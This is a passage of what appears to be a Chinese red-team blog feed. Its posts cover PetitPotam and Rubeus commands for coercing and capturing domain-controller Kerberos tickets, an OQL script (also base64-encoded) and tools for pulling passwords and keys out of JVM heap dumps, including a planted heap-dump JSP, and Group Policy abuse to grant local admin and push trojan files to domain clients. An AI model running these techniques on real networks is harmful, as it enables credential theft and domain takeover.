class="selector-tag">-dc-ip</span> 10<span class="selector-class">.10</span><span class="selector-class">.10</span><span class="selector-class">.10</span> <span class="selector-tag">ad01-2016</span><span class="selector-class">.redteam</span><span class="selector-class">.com</span> <span class="selector-tag">-no-pass</span> <span class="selector-tag">-k</span> <span class="selector-tag">-codec</span> <span class="selector-tag">gbk</span></span><br></pre></td></tr></table></figure><h4 id="方法3：PetitPotam-MS-EFSRPC远程文件加密协议漏洞强制域请求"><a href="#方法3：PetitPotam-MS-EFSRPC远程文件加密协议漏洞强制域请求" class="headerlink" title="方法3：PetitPotam MS-EFSRPC远程文件加密协议漏洞强制域请求"></a>方法3：PetitPotam MS-EFSRPC远程文件加密协议漏洞强制域请求</h4><blockquote><p>利用EFSRPC（加密文件系统远程协议）进行中继攻击的漏洞（PetitPotam）,CVE-2021-36942</p></blockquote><p>利用条件：</p><ol><li>需要Administrator权限</li><li>需要Service系统或Service服务用户</li><li>2008-2012可匿名触发，2016及以上版本需要域内凭证<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用Rubeus监听来自域控的票据,1秒一次</span></span><br><span class="line">Rubeus.exe<span class="built_in"> monitor </span>/interval:1 /filteruser:ad01-2016$</span><br></pre></td></tr></table></figure>![image.png](11.png %}</li></ol><p><a href="https://github.com/topotam/PetitPotam.git" target="_blank" rel="noopener">https://github.com/topotam/PetitPotam.git</a></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">## Windows Server <span class="number">2008</span> <span class="number">2012</span>域内攻击方法</span><br><span class="line">PetitPotam.exe web<span class="number">-2012.</span>redteam.com <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Windows Server2016 或 域外攻击方法</span><br><span class="line">python3  PetitPotam.py -d redteam.com -u susan -p asd123= web<span class="number">-2012.</span>redteam.com <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span></span><br></pre></td></tr></table></figure><p>![image.png](12.png %}</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/seanzed/article/details/77619985" target="_blank" rel="noopener">AD用户属性userAccountControl的详细解释</a><br><a href="https://forum.butian.net/index.php/share/1591" target="_blank" rel="noopener">红队域渗透技术：委派攻击汇总（全）</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;非约束性委派(Unconstrained Delegation)，服务账号可以获取某用户的 TGT，从而服务账号可使用该 TGT，模拟用户&lt;strong&gt;访问任意服务。&lt;/strong&gt;&lt;br&gt;如果某个服务 A 的服务账号 B 被设置为非约束委派，当用户 C 通过 Kerberos 认证访问服务 A 时，KDC 会检查服务账号 B 的属性，发现是非约束性委派时，KDC 会将用户 C 的 TGT 放在 TGS 中，这样 B 在验证 TGS 的同时获取了 A 用户的 TGT，从而可以模拟用户 A 访问&lt;code&gt;任意&lt;/code&gt;服务。&lt;/p&gt;</summary>
    
    
    
    <category term="委派" scheme="https://chenzidu.github.io/categories/%E5%A7%94%E6%B4%BE/"/>
    
    
    <category term="Windows" scheme="https://chenzidu.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Java 导出内存查找敏感信息</title>
    <link href="https://chenzidu.github.io/2023/01/04/Java-%E5%AF%BC%E5%87%BA%E5%86%85%E5%AD%98%E6%9F%A5%E6%89%BE%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/"/>
    <id>https://chenzidu.github.io/2023/01/04/Java-%E5%AF%BC%E5%87%BA%E5%86%85%E5%AD%98%E6%9F%A5%E6%89%BE%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/</id>
    <published>2023-01-04T08:23:48.000Z</published>
    <updated>2023-01-04T08:27:16.283Z</updated>
    
    <content type="html"><![CDATA[<p>如果重要的数据（保存在内存中）在使用后没有及时清理，有可能会导致信息泄漏。开发人员通常都回用String 保存敏感数据（密码，卡号等）。因为String 对象是不可变的，只有 JVM 的垃圾回收器才能从内存中清除String的值。而只有内存不足的时候虚拟机才会执行垃圾回收，所以我们不能保证垃圾回收什么时候进行。当系统崩溃后，memory dump 可能会泄漏敏感数据。</p><a id="more"></a><h2 id="1、获取JVMHeapDump"><a href="#1、获取JVMHeapDump" class="headerlink" title="1、获取JVMHeapDump"></a>1、获取JVMHeapDump</h2><blockquote><p><strong>内存转储执行的过程中为了保证dump的信息是可靠的，所以会暂停应用</strong>， <strong>线上系统慎用</strong>。<br>JVM会将整个heap的信息dump写入到一个文件，heap如果比较大的话，就会导致这个过程比较耗时，如果要转储千兆字节大小的堆，则暂停时间以<strong>分钟</strong>而不是<strong>秒</strong>为单位。</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#jmap，jcmd 都是JDK自带工具，指定JVM pid 直接dump</span></span><br><span class="line">jcmd <span class="number">5760</span>[PID] GC.heap_dump <span class="regexp">/tmp/</span>dumpHeap.hprof</span><br><span class="line">此转储过程比使用jmap进行转储要快得多！转储文件要小得多，但足以让您知道泄漏的位置。</span><br></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;jmap -<span class="keyword">dump</span>:live,format=b,<span class="keyword">file</span>=<span class="regexp">/tmp/</span>dumpHeap.hprof <span class="number">5760</span>  #live Object</span><br><span class="line"></span><br><span class="line">&gt;jmap -<span class="keyword">dump</span>:format=b,<span class="keyword">file</span>=<span class="regexp">/tmp/</span>dumpHeap.hprof <span class="number">19770</span>  # all Object 不建议</span><br><span class="line">如果使用<span class="string">"-dump"</span>，则将转储整个堆，包括不可达的对象。如果使用<span class="string">"-dump:live"</span>，则只会转储可访问的对象，但这（至少）需要标记堆以找出可访问的对象。</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/2118454/1672820322869-0e9aff63-b7e7-4f96-98be-3ae1f31a5010.png#averageHue=%232d2c2a&clientId=u8f4a23e9-4595-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=211&id=uea618b0d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=316&originWidth=958&originalType=binary&ratio=1&rotation=0&showTitle=false&size=89994&status=done&style=none&taskId=ueebb3af7-f629-4c53-be13-0e6184c95c8&title=&width=638.6666666666666" alt="image.png"></p><h2 id="2、工具"><a href="#2、工具" class="headerlink" title="2、工具"></a>2、工具</h2><h3 id="JavaPassDump"><a href="#JavaPassDump" class="headerlink" title="JavaPassDump"></a>JavaPassDump</h3><p>工具：<a href="https://github.com/corener/JavaPassDump" target="_blank" rel="noopener">https://github.com/corener/JavaPassDump</a></p><blockquote><p>所有在Java层的数据库连接，最终都会维持一个DB Driver Object，其中会保留数据库的连接配置。<br>思路一：基于经验的，匹配所有DB Driver，从内存中找到Driver Object，获取username&#x2F;password字段 ；<br>思路二：绝大部分的配置信息，在内存中，都是String类型的field字段，直接从内存中提取password字段的field值。两种思路的前提都是能够分析内存，尝试直接分析运行时内存，从中提取配置信息，无奈坑点太多，遂转入dump JVMHeap，直接通过OQL语言进行分析。<br>实战中，DumpJVNHeap大小从几M～几G左右不等，拉到本地分析不太现实，直接在线上分析拿到分析结果就行。这样，在流量层面，效率方面，更优化。为了更简单通用，采用思路二，直接提取password字段的值。</p></blockquote><p>根据线上JDK环境，适配对应的jar，</p><ul><li>OQLQuery7-.jar 适配JDK&lt;&#x3D;7 </li><li>OQLQuery8+.jar 适配JDK&gt;&#x3D;8</li></ul><p>除了线上环境，OQLQuery.jar也可以用在本地分析JvmHeapDump.hprof文件，例如：Spring的&#x2F;heapdump接口，产生的dump文件，利用对应的OQL语句，也可以提取出密码参数 。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">## 放置于webServer的web路径下，访问时，dump当前JVM的heap到/tmp目录，windows系统，需要修改路径</span></span><br><span class="line"><span class="attr">&gt;heapDump.jsp </span></span><br><span class="line"><span class="attr"></span></span><br><span class="line"><span class="attr">## 分析JVMHeap文件 结尾为oql语句 base64</span>编码</span><br><span class="line">java -jar ./OQLQuery.jar /tmp/dumpHeap.hprof dmFyIGZpbHRlciA<span class="number">9</span>IHt<span class="number">9</span>OwptYXAoaGVhcC<span class="number">5</span>jbGFzc<span class="number">2</span>VzKCksIGZ<span class="number">1</span>bm<span class="symbol">N0</span>aW<span class="number">9</span>uIChjbHMpIHsKICAgcmV<span class="number">0</span>dXJuI<span class="name">G1</span>hcChjbHMuZmllbGRzLCBmdW<span class="number">5</span>jdGlvbiAoZmllbGQpIHsgCiAgICAgIGlmKCBmaW<span class="attr">VsZC5</span>uYW<span class="number">1</span>lL<span class="symbol">nRvU3</span>RyaW<span class="number">5</span><span class="symbol">nKCkuY29</span>udGFpb<span class="symbol">nMoInBhc3</span>MiKSB<span class="number">8</span>fCBmaW<span class="attr">VsZC5</span>uYW<span class="number">1</span>lL<span class="symbol">nRvU3</span>RyaW<span class="number">5</span><span class="symbol">nKCkuY29</span>udGFpb<span class="symbol">nMoInVzZXJuYW1</span>lIikgfHxmaW<span class="attr">VsZC5</span>uYW<span class="number">1</span>lL<span class="symbol">nRvU3</span>RyaW<span class="number">5</span><span class="symbol">nKCkuY29</span>udGFpb<span class="symbol">nMoIlBBU1</span>MiKSl<span class="number">7</span>CiAgICAgICAgcmV<span class="number">0</span>dXJuI<span class="name">G1</span>hcChoZWFwL<span class="name">m9</span>iamVjdHMoY<span class="number">2</span>xzKSwgZ<span class="symbol">nVuY3</span>Rpb<span class="number">24</span>gK<span class="name">G9</span>icykgewogICAgICAgICAgdmFyIHRhZyA<span class="number">9</span>IG<span class="symbol">Nscy5</span>uYW<span class="number">1</span>lKyJ<span class="number">8</span>IitmaW<span class="attr">VsZC5</span>uYW<span class="number">1</span>lIDsKICAgICAgICAgIHZhciByZXMgPSAgIm<span class="symbol">NsYXNzIDogIitjbHMubmFtZSsiXG4</span>gRmllbGQgWyAiK<span class="number">2</span>ZpZWxkL<span class="name">m5</span>hbWUud<span class="name">G9</span>TdHJpbmcoKSsiIDogIjsKICAgICAgICAgIGlmKCBvY<span class="symbol">nNbZmllbGQubmFtZS50</span>b<span class="number">1</span><span class="symbol">N0</span>cmluZygpXSAhPSBudWxsICl<span class="number">7</span>CiAgICAgICAgICAgIHJlcyA<span class="number">9</span>IHJlcyArI<span class="name">G9</span>ic<span class="number">1</span>tmaW<span class="attr">VsZC5</span>uYW<span class="number">1</span>lL<span class="symbol">nRvU3</span>RyaW<span class="number">5</span><span class="symbol">nKCldLnRvU3</span>RyaW<span class="number">5</span><span class="symbol">nKCkrIiBdXG4</span>iOwogICAgICAgICAgfW<span class="attr">Vsc2</span>V<span class="number">7</span>CiAgICAgICAgICAgIHJlcyA<span class="number">9</span>IHJlcyArICJudWxsIF<span class="number">1</span>cbiI<span class="number">7</span>CiAgICAgICAgICB<span class="number">9</span>CiAgICAgICAgICBpZiAoZmlsdGVyW<span class="number">3</span>RhZ<span class="number">10</span>gPT<span class="number">0</span>gb<span class="symbol">nVsbCkgewogICAgICAgICAgICBmaWx0</span>ZXJbdGF<span class="symbol">nXSA9</span>IHJlczsKICAgICAgICAgICAgcHJpb<span class="symbol">nQocmVzKTsKICAgICAgICAgIH0</span>KICAgICAgICAgIHJldHVybiBudWxsOwogICAgICAgIH<span class="number">0</span>pOwogICAgICB<span class="number">9</span>CiAgICAgIHJldHVybiBudWxsOwogIH<span class="number">0</span>pOwp<span class="number">9</span>KTs=</span><br></pre></td></tr></table></figure><p>oql语句</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">var<span class="built_in"> filter</span> = &#123;&#125;;</span><br><span class="line"><span class="keyword">map</span>(heap.classes(), <span class="keyword">function</span> (cls) &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">map</span>(cls.fields, <span class="keyword">function</span> (field) &#123; </span><br><span class="line">      <span class="keyword">if</span>( field<span class="built_in">.name</span>.toString()<span class="built_in">.contains</span>(<span class="string">"pass"</span>) || field<span class="built_in">.name</span>.toString()<span class="built_in">.contains</span>(<span class="string">"username"</span>) ||field<span class="built_in">.name</span>.toString()<span class="built_in">.contains</span>(<span class="string">"PASS"</span>)||field<span class="built_in">.name</span>.toString()<span class="built_in">.contains</span>(<span class="string">"key"</span>)||field<span class="built_in">.name</span>.toString()<span class="built_in">.contains</span>(<span class="string">"KEY"</span>)||field<span class="built_in">.name</span>.toString()<span class="built_in">.contains</span>(<span class="string">"key"</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">map</span>(heap.objects(cls), <span class="keyword">function</span> (obs) &#123;</span><br><span class="line">          var tag = cls<span class="built_in">.name</span>+<span class="string">"|"</span>+field<span class="built_in">.name</span> ;</span><br><span class="line">          var res =  <span class="string">"class : "</span>+cls<span class="built_in">.name</span>+<span class="string">"\n Field [ "</span>+field<span class="built_in">.name</span>.toString()+<span class="string">" : "</span>;</span><br><span class="line">          <span class="keyword">if</span>( obs[field<span class="built_in">.name</span>.toString()] != null )&#123;</span><br><span class="line">            res = res + obs[field<span class="built_in">.name</span>.toString()].toString()+<span class="string">" ]\n"</span>;</span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res = res + <span class="string">"null ]\n"</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> <span class="built_in">(filter</span>[tag] == null) &#123;</span><br><span class="line">           <span class="built_in"> filter</span>[tag] = res;</span><br><span class="line">            print(res);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> null;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> null;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dmFyIGZpbHRlciA9IHt9OwptYXAoaGVhcC5jbGFzc2VzKCksIGZ1bmN0aW9uIChjbHMpIHsKICAgcmV0dXJuIG1hcChjbHMuZmllbGRzLCBmdW5jdGlvbiAoZmllbGQpIHsgCiAgICAgIGlmKCBmaWVsZC5uYW1lLnRvU3RyaW5nKCkuY29udGFpbnMoInBhc3MiKSB8fCBmaWVsZC5uYW1lLnRvU3RyaW5nKCkuY29udGFpbnMoInVzZXJuYW1lIikgfHxmaWVsZC5uYW1lLnRvU3RyaW5nKCkuY29udGFpbnMoIlBBU1MiKXx8ZmllbGQubmFtZS50b1N0cmluZygpLmNvbnRhaW5zKCJrZXkiKXx8ZmllbGQubmFtZS50b1N0cmluZygpLmNvbnRhaW5zKCJLRVkiKXx8ZmllbGQubmFtZS50b1N0cmluZygpLmNvbnRhaW5zKCJrZXkiKSl7CiAgICAgICAgcmV0dXJuIG1hcChoZWFwLm9iamVjdHMoY2xzKSwgZnVuY3Rpb24gKG9icykgewogICAgICAgICAgdmFyIHRhZyA9IGNscy5uYW1lKyJ8IitmaWVsZC5uYW1lIDsKICAgICAgICAgIHZhciByZXMgPSAgImNsYXNzIDogIitjbHMubmFtZSsiXG4gRmllbGQgWyAiK2ZpZWxkLm5hbWUudG9TdHJpbmcoKSsiIDogIjsKICAgICAgICAgIGlmKCBvYnNbZmllbGQubmFtZS50b1N0cmluZygpXSAhPSBudWxsICl7CiAgICAgICAgICAgIHJlcyA9IHJlcyArIG9ic1tmaWVsZC5uYW1lLnRvU3RyaW5nKCldLnRvU3RyaW5nKCkrIiBdXG4iOwogICAgICAgICAgfWVsc2V7CiAgICAgICAgICAgIHJlcyA9IHJlcyArICJudWxsIF1cbiI7CiAgICAgICAgICB9CiAgICAgICAgICBpZiAoZmlsdGVyW3RhZ10gPT0gbnVsbCkgewogICAgICAgICAgICBmaWx0ZXJbdGFnXSA9IHJlczsKICAgICAgICAgICAgcHJpbnQocmVzKTsKICAgICAgICAgIH0KICAgICAgICAgIHJldHVybiBudWxsOwogICAgICAgIH0pOwogICAgICB9CiAgICAgIHJldHVybiBudWxsOwogIH0pOwp9KTs=</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/2118454/1672728774252-a0b92579-19ca-47f0-b3ba-4824bc41fbc8.png#averageHue=%232e2f37&clientId=u53581134-91f7-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=333&id=u29a48a59&margin=%5Bobject%20Object%5D&name=image.png&originHeight=500&originWidth=903&originalType=binary&ratio=1&rotation=0&showTitle=false&size=283298&status=done&style=none&taskId=u9c90d513-8459-4b04-9dde-81b011b5551&title=&width=602" alt="image.png"></p><h3 id="heapdump-tool"><a href="#heapdump-tool" class="headerlink" title="heapdump_tool"></a>heapdump_tool</h3><blockquote><p>该工具是基于jhat，通过jhat解析heapdump文件，所以需要安装jdk和配置好环境变量，例如win \Java\jdk8\bin\jhat.exe，  在控制台输入jhat检查是否安装正确。</p></blockquote><p><a href="https://toolaffix.oss-cn-beijing.aliyuncs.com/wyzxxz/20220720/heapdump_tool.jar" target="_blank" rel="noopener">https://toolaffix.oss-cn-beijing.aliyuncs.com/wyzxxz/20220720/heapdump_tool.jar</a></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">usage:&gt; java -jar heapdump_tool.jar  heapdump</span><br><span class="line">查询方式：</span><br><span class="line"><span class="number">1.</span> 关键词    例如 password </span><br><span class="line"><span class="number">2.</span> 字符长度   len=<span class="number">10</span>    获取长度为<span class="number">10</span>的所有key或者value值</span><br><span class="line"><span class="number">3.</span> 按顺序获取  num=<span class="number">1</span><span class="number">-100</span> 获取顺序<span class="number">1</span><span class="number">-100</span>的字符</span><br><span class="line">获取url,file,ip</span><br><span class="line">geturl   获取所有字符串中的url</span><br><span class="line">getfile  获取所有字符串中的文件路径文件名</span><br><span class="line">getip    获取所有字符串中的ip</span><br><span class="line">默认不输出查询结果非key-value格式的数据，需要获取所有值，输入all=<span class="literal">true</span>，all=<span class="literal">false</span>取消显示所有值。</span><br></pre></td></tr></table></figure><h3 id="JDumpSpider"><a href="#JDumpSpider" class="headerlink" title="JDumpSpider"></a>JDumpSpider</h3><blockquote><p>本工具需要使用 Oracle JDK 1.8 版本（更高版本将导致异常）。</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar .\target\JDumpSpider-<span class="number">1.0</span>-SNAPSHOT-full.jar                  </span><br><span class="line">Missing required parameter: <span class="string">'&lt;heapfile&gt;'</span></span><br><span class="line">Usage: JDumpSpider [-hV] &lt;heapfile&gt;                   </span><br><span class="line">Extract sensitive information from heapdump file.     </span><br><span class="line">      &lt;heapfile&gt;   Heap file path.                    </span><br><span class="line">  -h, --help       Show this help message and <span class="keyword">exit</span>.   </span><br><span class="line">  -V, --version    Print version information and <span class="keyword">exit</span>.</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;如果重要的数据（保存在内存中）在使用后没有及时清理，有可能会导致信息泄漏。开发人员通常都回用String 保存敏感数据（密码，卡号等）。因为String 对象是不可变的，只有 JVM 的垃圾回收器才能从内存中清除String的值。而只有内存不足的时候虚拟机才会执行垃圾回收，所以我们不能保证垃圾回收什么时候进行。当系统崩溃后，memory dump 可能会泄漏敏感数据。&lt;/p&gt;</summary>
    
    
    
    
    <category term="java" scheme="https://chenzidu.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>组策略定向攻击</title>
    <link href="https://chenzidu.github.io/2022/12/11/%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/"/>
    <id>https://chenzidu.github.io/2022/12/11/%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/</id>
    <published>2022-12-11T09:45:41.000Z</published>
    <updated>2022-12-11T09:48:14.284Z</updated>
    
    <content type="html"><![CDATA[<p>大部份的公司的局域网都用到域服务来管理办公电脑，而域管理最主要的就是域策略配置，策略配置的好可以大大增加局域网的安全性。配置不当可称为攻击者后渗透的攻击手段。</p><a id="more"></a><h2 id="1、添加用户为本地管理员"><a href="#1、添加用户为本地管理员" class="headerlink" title="1、添加用户为本地管理员"></a>1、添加用户为本地管理员</h2><h3 id="1-1、添加域用户（可以用已有域用户）"><a href="#1-1、添加域用户（可以用已有域用户）" class="headerlink" title="1.1、添加域用户（可以用已有域用户）"></a>1.1、添加域用户（可以用已有域用户）</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1670655796864-e28564e4-1da1-479e-8454-12ff52329e92.png#averageHue=%23eaeae6&clientId=ufa8cf655-9900-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=468&id=ua913c31d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=702&originWidth=1255&originalType=binary&ratio=1&rotation=0&showTitle=false&size=350454&status=done&style=none&taskId=u11c49e41-4747-49e7-b651-d2ab15c9c32&title=&width=836.6666666666666" alt="image.png"></p><h3 id="2-2、创建组策略"><a href="#2-2、创建组策略" class="headerlink" title="2.2、创建组策略"></a>2.2、创建组策略</h3><p> <strong>操作流程</strong>：服务器管理器 -&gt; 组策略管理  -&gt; 林：domain.com -&gt; 域 -&gt; domain.com -&gt; Default Domain Policy -&gt; 编辑 -&gt; 计算机配置 -&gt; 首选项 -&gt; 控制面板 -&gt; 本地用户和组 -&gt; 新建 -&gt; 本地组 -&gt; 添加域账户<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1670250888859-54b039aa-69fe-44c8-a375-66152817ef6e.png#averageHue=%2366adcf&clientId=uedff4467-84d6-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=387&id=u6956d1bb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=581&originWidth=1096&originalType=binary&ratio=1&rotation=0&showTitle=false&size=153273&status=done&style=none&taskId=ufe5ed617-8553-4db6-b7be-a7e2b9820ac&title=&width=730.6666666666666" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1670655823522-87a3eeb8-4472-4bf6-98fd-6bb37024d2a3.png#averageHue=%23bfd7dd&clientId=ufa8cf655-9900-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=573&id=ubb6c2ba7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=860&originWidth=1254&originalType=binary&ratio=1&rotation=0&showTitle=false&size=341915&status=done&style=none&taskId=ue9f5f460-ba2e-41a1-a358-53c9d564cc2&title=&width=836" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1670250933822-33132226-9fd8-4b92-9895-3ba442a2fe80.png#averageHue=%23eff1ef&clientId=uedff4467-84d6-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=402&id=u9ebe3d40&margin=%5Bobject%20Object%5D&name=image.png&originHeight=603&originWidth=1077&originalType=binary&ratio=1&rotation=0&showTitle=false&size=184321&status=done&style=none&taskId=ua934c60d-c817-419f-a2e5-4a550ed5122&title=&width=718" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1670655849958-cb33556b-7498-4673-bb2c-400617253bd8.png#averageHue=%23b0c1cf&clientId=ufa8cf655-9900-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=623&id=u99120b76&margin=%5Bobject%20Object%5D&name=image.png&originHeight=934&originWidth=1045&originalType=binary&ratio=1&rotation=0&showTitle=false&size=125711&status=done&style=none&taskId=uce50f65e-ae07-4409-bcde-f6a0ee8f6ab&title=&width=696.6666666666666" alt="image.png"><br>刷新组策略gpupdate &#x2F;force</p><h2 id="2、域内木马文件共享"><a href="#2、域内木马文件共享" class="headerlink" title="2、域内木马文件共享"></a>2、域内木马文件共享</h2><h3 id="2-1、域内共享文件夹"><a href="#2-1、域内共享文件夹" class="headerlink" title="2.1、域内共享文件夹"></a>2.1、域内共享文件夹</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NETLOGON目录</span><br><span class="line">C:<span class="symbol">\W</span>indows<span class="symbol">\s</span>ysvol<span class="symbol">\d</span>omain.com<span class="symbol">\S</span>CRIPTS</span><br><span class="line">SYSVOL目录</span><br><span class="line">C:<span class="symbol">\W</span>indows<span class="symbol">\S</span>YSVOL<span class="symbol">\s</span>ysvol</span><br></pre></td></tr></table></figure><h4 id="2-1-1、NETLOGON目录"><a href="#2-1-1、NETLOGON目录" class="headerlink" title="2.1.1、NETLOGON目录"></a>2.1.1、NETLOGON目录</h4><p>挂载点:SYSVOL\domain\SCRIPTS 主要存放的是一些脚本信息，是AD活动目录安装时候自动创建的，是在sysvol下面的一个子目录文件夹。</p><h4 id="2-1-2、SYSVOL目录"><a href="#2-1-2、SYSVOL目录" class="headerlink" title="2.1.2、SYSVOL目录"></a>2.1.2、SYSVOL目录</h4><p>AD域中的一个共享文件夹，该文件夹在AD活动目录安装时候被创建。通常用来存放组策略数据 和 一些脚本配置文件，这些策略和脚本将用于传递给域成员机器。<br>此外，域控机器之间因为要自动同步域数据，SYSVOL文档允许该域内的所有DC机之间进行复制，并且所有的AD用户都可以访问它。域中，用户登录（计算机）时，会首先在SYSVOL文件查找GPO和启动脚本。同时，为了保证系统的正常运行，必须为SYSVOL保留足够的空间缓存，而且不能随意删除、改动该文件夹，要不然会出现一些组策略无法启用等报错信息。该目录由于针对的是域内所有机器和用户，所以域内中的合法用户均可以访问和执行该目录的文件。(普通的域用户也可以)<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1670250051764-88fd6d69-72a6-4e81-98bf-ef39d93ebc31.png#averageHue=%230f0f0e&clientId=uedff4467-84d6-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u8a838f00&margin=%5Bobject%20Object%5D&name=image.png&originHeight=249&originWidth=817&originalType=url&ratio=1&rotation=0&showTitle=false&size=27720&status=done&style=none&taskId=ua118eea6-3420-40e0-8a3b-633b2c6fe02&title=" alt="image.png"></p><h3 id="2-2、操作方法"><a href="#2-2、操作方法" class="headerlink" title="2.2、操作方法"></a>2.2、操作方法</h3><h4 id="2-2-1、新建共享文件夹"><a href="#2-2-1、新建共享文件夹" class="headerlink" title="2.2.1、新建共享文件夹"></a>2.2.1、新建共享文件夹</h4><p> 设置共享权限，添加everyone和domain user共享权限。</p><h4 id="2-2-2、域控推送共享文件到客户端桌面"><a href="#2-2-2、域控推送共享文件到客户端桌面" class="headerlink" title="2.2.2、域控推送共享文件到客户端桌面"></a>2.2.2、域控推送共享文件到客户端桌面</h4><ul><li><p>开始 -&gt; 管理工具 -&gt; 组策略管理 -&gt; TJXY.COM(域名) -&gt; Default Domain Policy右键属性 -&gt; 编辑 -&gt; 用户配置 -&gt; 首选项 -&gt; Windows设置 -&gt; 文件</p></li><li><p>右键文件 -&gt; 新建 -&gt; 文件</p><p>   源文件是文件共享路径位置，目标文件是客户端桌面位置</p></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1670655902481-8d8a8587-4205-4708-88b1-82e9102e00f9.png#averageHue=%23d0caaa&clientId=ufa8cf655-9900-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=425&id=uf99038c1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=637&originWidth=1244&originalType=binary&ratio=1&rotation=0&showTitle=false&size=215918&status=done&style=none&taskId=u29777160-d629-4c36-916b-901c5323243&title=&width=829.3333333333334" alt="image.png"><br>      编辑完成后确定，注意：域控推送文件到客户端桌面，配置完成后服务器和主机先后更新组策略。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">服务器默认更新组策略时间为<span class="number">5</span>分钟，客户端电脑默认更新组策略时间为<span class="number">90</span>分钟。</span><br><span class="line">## 立即更新组策略</span><br><span class="line">gpupdate /force</span><br></pre></td></tr></table></figure><h2 id="3、域内计划任务创建"><a href="#3、域内计划任务创建" class="headerlink" title="3、域内计划任务创建"></a>3、域内计划任务创建</h2><h3 